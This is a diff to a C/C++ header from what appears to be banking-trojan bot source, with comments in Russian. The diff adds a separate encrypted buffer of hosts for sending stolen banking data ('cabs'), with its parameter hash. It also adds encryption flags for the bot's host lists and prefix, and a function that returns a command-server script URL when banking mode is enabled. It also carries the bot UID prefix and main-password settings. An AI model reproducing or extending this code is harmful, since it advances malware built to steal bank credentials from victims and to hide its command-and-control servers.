@@ -35,10 +35,11 @@
 
 
 // Максимальные размеры массивов с данными
-#define MAX_HOSTS_BUF_SIZE 500 /* Максимальный размер буфера хранения ссылок */
-#define MAX_PASSWORD_SIZE  32  /* Размер буфера хранения основного пароля */
-#define MAX_PREFIX_SIZE    20  /* Размер буфера для префикса бота */
-#define MAX_DELAY_SIZE     8   /* Буфер для хранения задержки */
+#define MAX_MAINHOSTS_BUF_SIZE 500 /* Размер буфера хранения ссылок */
+#define MAX_BANKHOSTS_BUF_SIZE 128 /* размер буфера хранения хостов отправки кабов */
+#define MAX_PASSWORD_SIZE      32  /* Размер буфера хранения основного пароля */
+#define MAX_PREFIX_SIZE        20  /* Размер буфера для префикса бота */
+#define MAX_DELAY_SIZE         8   /* Буфер для хранения задержки */
 
 
 #define DEFAULT_DELAY  10 /* Задержка по умолчанию */
@@ -48,16 +49,25 @@
 
 #define BOTPARAM_PREFIX       "BOT_UID"
 #define BOTPARAM_MAINHOSTS    "ALL_HOSTS_BUFFER\0\0"
+#define BOTPARAM_BANKHOSTS    "CAB_HOSTS_BUFFER\0\0"
 #define BOTPARAM_DELAY        "DELAY_"
 #define BOTPARAM_MAINPASSWORD "MAIN_PASSWORD"
 
 
+//Хэши имён параметров
+
+#define BOTPARAM_HASH_BANKHOSTS  0x998F4828 /* CAB_HOSTS_BUFFER */
+#define BOTPARAM_HASH_MAINHOSTS  0xE98F4C1C /* ALL_HOSTS_BUFFER */
+
+// Настройки шифрования параметров
 #ifndef DEBUGCONFIG
-	#define BOTPARAM_ENCRYPTED_HOSTS  true
-	#define BOTPARAM_ENCRYPTED_PREFIX true
+	#define BOTPARAM_ENCRYPTED_MAINHOSTS true
+	#define BOTPARAM_ENCRYPTED_BANKHOSTS true
+	#define BOTPARAM_ENCRYPTED_PREFIX    true
 #else
-	#define BOTPARAM_ENCRYPTED_HOSTS  false
-	#define BOTPARAM_ENCRYPTED_PREFIX false
+	#define BOTPARAM_ENCRYPTED_MAINHOSTS false
+	#define BOTPARAM_ENCRYPTED_BANKHOSTS false
+	#define BOTPARAM_ENCRYPTED_PREFIX    false
 #endif
 
 //--------------------------------------------------------
@@ -108,6 +118,15 @@ PCHAR GetMainPassword(bool NotNULL = false);
 //  будет использоваться путь прописанный для скрипта с номером Script
 //------------------------------------------------------------------------
 PCHAR GetBotScriptURL(DWORD Script, PCHAR Path = NULL);
+
+
+
+//-----------------------------------------------------
+//  GetBankingScriptURL-  Функция возвращает адрес
+//		скрипта с проверкой включенного режима Banking
+//-----------------------------------------------------
+string GetBankingScriptURL(DWORD Script, bool CheckBankingMode);
+
 
 
 // Функция генерирует случайноре имя скрипта
